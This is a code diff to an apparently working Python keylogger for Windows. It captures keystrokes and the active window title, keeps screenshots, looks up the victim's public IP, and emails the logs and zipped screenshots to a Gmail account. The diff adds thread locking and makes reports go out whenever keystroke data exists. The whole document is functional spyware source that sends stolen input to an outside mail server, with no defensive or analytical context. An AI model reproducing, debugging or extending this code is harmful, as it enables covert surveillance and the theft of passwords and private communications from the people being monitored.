@@ -42,6 +42,8 @@ timer = None
 memory_log = io.StringIO()
 screenshots = []
 
+lock = threading.Lock()
+
 def key_callback(event : keyboard.KeyboardEvent):
     global curr_window
 
@@ -51,6 +53,7 @@ def key_callback(event : keyboard.KeyboardEvent):
     user32 = ctypes.WinDLL('user32', use_last_error=True)
     new_window = win32gui.GetWindowText(user32.GetForegroundWindow())
 
+    lock.acquire()
     if new_window != curr_window:
         curr_window = new_window
 
@@ -70,18 +73,19 @@ def key_callback(event : keyboard.KeyboardEvent):
     log_line += screenshot_line
 
     memory_log.write(log_line + "\n")
+    lock.release()
 
     print(log_line)
 
 
-def attach_file(msg, filepath):
-    with open(filepath, "rb") as f:
-        part = MIMEBase("application", "octet-stream")
-        part.set_payload(f.read())
-    encoders.encode_base64(part)
-    filename = os.path.basename(filepath)
-    part.add_header("Content-Disposition", f"attachment; filename={filename}")
-    msg.attach(part)
+# def attach_file(msg, filepath):
+#     with open(filepath, "rb") as f:
+#         part = MIMEBase("application", "octet-stream")
+#         part.set_payload(f.read())
+#     encoders.encode_base64(part)
+#     filename = os.path.basename(filepath)
+#     part.add_header("Content-Disposition", f"attachment; filename={filename}")
+#     msg.attach(part)
 
 def send_report():
     global screenshots
@@ -90,7 +94,7 @@ def send_report():
     
     print("Trying to send report")
     # try:
-    if len(screenshots) > 0:
+    if len(memory_log.getvalue()) > 0:
         print("Sending report")
         data = str(urlopen('http://checkip.dyndns.com/').read())
         ip = re.compile(r'Address: (\d+\.\d+\.\d+\.\d+)').search(data).group(1)
@@ -98,6 +102,8 @@ def send_report():
         msg['Subject'] = f"Report From {ip}"
         msg['From'] = EMAIL
         msg['To'] = EMAIL
+
+        lock.acquire()
 
         zip_buffer = io.BytesIO()
         with zipfile.ZipFile(zip_buffer, "w") as z:
@@ -110,18 +116,21 @@ def send_report():
         log_file["Content-Disposition"] = 'attachment; filename="log.txt"'
         msg.attach(log_file)
 
-        zip_file = MIMEApplication(zip_buffer.getvalue(), Name="screenshots.zip")
-        zip_file["Content-Disposition"] = 'attachment; filename="screenshots.zip"'
-        msg.attach(zip_file)
+        if len(screenshots) > 0:
+            zip_file = MIMEApplication(zip_buffer.getvalue(), Name="screenshots.zip")
+            zip_file["Content-Disposition"] = 'attachment; filename="screenshots.zip"'
+            msg.attach(zip_file)
+
         with smtplib.SMTP_SSL('smtp.gmail.com', 465) as smtp_server:
             smtp_server.login(EMAIL, EMAIL_PASSWORD)
             smtp_server.sendmail(EMAIL, EMAIL, msg.as_string())
-
 
         # clear files
         memory_log.seek(0)
         memory_log.truncate(0)
         screenshots = []
+
+        lock.release()
 
     # except Exception as e:
     #     print("Failed to send report")
@@ -174,7 +183,6 @@ def setup():
             smtp_server.sendmail(EMAIL, EMAIL, msg.as_string())
     except Exception as e:
         pass
-
 
 def cleanup():
 
